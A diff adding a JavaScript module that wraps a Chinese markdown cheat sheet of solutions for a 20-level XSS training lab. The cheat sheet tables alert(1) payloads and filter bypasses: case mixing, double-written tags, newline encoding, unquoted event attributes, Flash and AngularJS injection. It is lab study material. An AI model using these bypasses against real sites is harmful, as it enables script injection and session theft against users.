@@ -1,0 +1,58 @@
+const n="青岑-PS89-xss-labs清库",e="青岑-PS89-xss-labs清库",l="PS89 xss-labs 20 关 **20/20 全解**。经典 XSS 梯度靶场（reflected → 过滤绕过 → DOM → 事件注入 → 编码混淆），本页记有 WP 的 12 关速查，其余 8 关同型。",s=`# 青岑-PS89-xss-labs清库
+
+> PS89 xss-labs 20 关 **20/20 全解**。经典 XSS 梯度靶场（reflected → 过滤绕过 → DOM → 事件注入 → 编码混淆），本页记有 WP 的 12 关速查，其余 8 关同型。
+
+## 一、反射型（基础）
+
+| 关 | 考点 | payload |
+|---|---|---|
+| 896 level1 | 无过滤直接回显 | \`?name=<script>alert(1)<\/script>\`；页面有 alert 钩子自动跳 flag.php |
+| 909 level14 | iframe 内嵌页面 pic 参数原样回显 | \`<svg onload=alert(1)>\` |
+
+## 二、过滤绕过
+
+| 关 | 过滤方式 | 绕过 |
+|---|---|---|
+| 900 level5 | on 事件与 \`<script>\` 加下划线 | 标签构造未被拦：\`><iframe src=javascript:alert(1)>\` |
+| 901 level6 | 加下划线但**大小写敏感** | \`<sCrIpT>alert(1)<\/ScRiPt>\` 混写 |
+| 902 level7 | 关键字**删除**而非编码 | 双写 \`<scrscriptipt>\` 删一次还原 |
+| 904 level9 | level8 基础上加 http:// 合法性检查 | \`javascript:alert(1)/*http://*/\` 注释夹带合法子串 |
+| 911 level16 | 过滤含空格的关键字 | \`%0a\` 换行编码：\`<img%0Asrc=x%0Aonerror=alert(1)>\` |
+
+## 三、事件与属性注入（无引号/编码）
+
+| 关 | 场景 | 手法 |
+|---|---|---|
+| 912 level17 | arg01/arg02 拼进 \`<embed src=xsf01.swf?x=y>\`，引号被编码但空格保留 | 无引号事件属性 \`onmouseover=alert(1)\` |
+| 913 level18 | 同 level17（xsf02.swf） | 同上 |
+| 914 level19 | Flash 变量注入：flashvars 传 xsf03.swf，version 以 htmlText 渲染 | \`<img onerror=...>\` 触发 |
+| 915 level20 | xsf04.swf：服务端编码只影响 HTML 层，SWF 拿 URL 解码后的原串 | 同上 htmlText 渲染 |
+
+## 四、DOM / 框架类
+
+| 关 | 考点 | 手法 |
+|---|---|---|
+| 910 level15 | AngularJS 1.x ng-include | src 指向含反射 XSS 的页面（借 level1 的 name 参数），angular 编译执行 onerror |
+
+## 关键点
+
+- **过滤绕过三件套**：大小写混写（901）、双写（902）、编码/换行打断关键字（911）
+- **注释夹带**（904）：让 payload 里出现合法子串过格式检查
+- **无引号注入**（912/913）：属性值被编码时，靠空格存活注入新属性
+- **Flash 层与 HTML 层解耦**（914/915）：服务端只编码 HTML，SWF 拿到的还是原串
+
+## 关联
+
+- [[Web-客户端攻击与前端安全]] —— XSS 三类判型与 CSP 绕过的理论底座
+- 〖内部笔记〗 —— 所属总战役
+- 〖内部笔记〗 —— XSS bot / DOM clobbering 进阶
+
+## 存疑 / 矛盾
+
+- 本页收录有 WP 的 12 关；level2/3/4/8/10/11/12/13 同型未单列。
+- 各关 flag 值不在本页（原始 WP 脚本在库外 \`~/CTF/scripts/qingcen/qc_wp_q896~915.py\`）。
+
+## 来源
+
+- 库外 WP 脚本 \`C:\\Users\\hwh\\CTF\\scripts\\qingcen\\qc_wp_q896~915.py\`（12 关）+ 平台记忆 \`qingcen-platform-state.md\`（20/20 全解）· 2026-10-31 整理
+`,t="project",r="project",a={internal:["Web-客户端攻击与前端安全"],unresolvedCount:2},c={name:n,title:e,summary:l,content:s,section:t,group:r,links:a};export{s as content,c as default,r as group,a as links,n as name,t as section,l as summary,e as title};
